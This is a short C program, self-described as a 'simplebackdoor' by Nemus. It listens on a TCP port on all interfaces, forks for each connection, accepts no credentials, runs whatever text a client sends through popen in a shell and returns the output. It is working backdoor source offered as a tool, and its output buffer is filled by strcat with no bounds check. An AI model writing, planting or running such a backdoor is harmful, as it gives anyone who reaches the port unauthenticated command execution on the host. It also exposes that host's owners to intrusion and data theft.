#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h> 
#include <sys/socket.h>
#include <netinet/in.h>

//simplebackdoor program by Nemus 

//prototype
void process(int);

//run script function
char* runScript(char* command,char* buff);

//eroor message handle
void error(char *msg){
    perror(msg);
    exit(1);
}

int main(int argc, char *argv[]){
		
     int server_sockfd;
	 int server_loopsockfd;
	 int port;
     int client_length; 
     int pid;

     struct sockaddr_in server_address, client_address;

     if (argc < 2) {
         fprintf(stderr,"ERROR: No port in args\n");
         exit(1);
     }

     server_sockfd = socket(AF_INET, SOCK_STREAM, 0);

     if (server_sockfd < 0){
        error("ERROR: Could not opening socket");
	 }

     bzero((char *) &server_address, sizeof(server_address));

     port = atoi(argv[1]);
     server_address.sin_family = AF_INET;
     server_address.sin_addr.s_addr = INADDR_ANY;
     server_address.sin_port = htons(port);

     if (bind(server_sockfd, (struct sockaddr *) &server_address,sizeof(server_address)) < 0){
              error("ERROR on binding to port number");
	 }

     listen(server_sockfd,5);
     client_length = sizeof(client_address);

     while(1){

         server_loopsockfd = accept(server_sockfd, (struct sockaddr *) &client_address, &client_length);

        if (server_loopsockfd < 0){
             error("ERROR: On accept");
		}
        pid = fork();
        if (pid < 0){
             error("ERROR on fork");
		}
        if (pid == 0)  {
             close(server_sockfd);
             process(server_loopsockfd);
             exit(0);
        }
        else{ 
			close(server_loopsockfd);
		}
     } 

     return 0;
}

void process (int sock){

	FILE *fp;
	int status;
	char path[1035];

	int n;
	char read_buffer[5000];
	char buffer[5000];
	char buffer2[5000];


	bzero(buffer,5000);
	bzero(buffer2,5000);
	bzero(read_buffer,5000);

	n = read(sock,read_buffer,5000);
	if (n < 0){ 
   		error("ERROR reading from socket");
	}
  	strncpy ( buffer, read_buffer, strlen(read_buffer)-2 );
	runScript(buffer,buffer2);

	n = write(sock,buffer2,5000);
	
	if (n < 0){
   		error("ERROR writing to socket");
   }
}

/*
* runs a bash script and returns the out put
*/
char*  runScript(char* command,char *buff){
	
   	FILE *fpipe;
	char path[1035];
	
	if ( !(fpipe = (FILE*)popen(command,"r")) ){  // If fpipe is NULL
			perror("Problems with pipe");
			exit(1);
	}

	while (fgets(path, sizeof(path)-1, fpipe) != NULL) {
    	strcat(buff,path);
  	}
	pclose(fpipe);
	return buff;
}

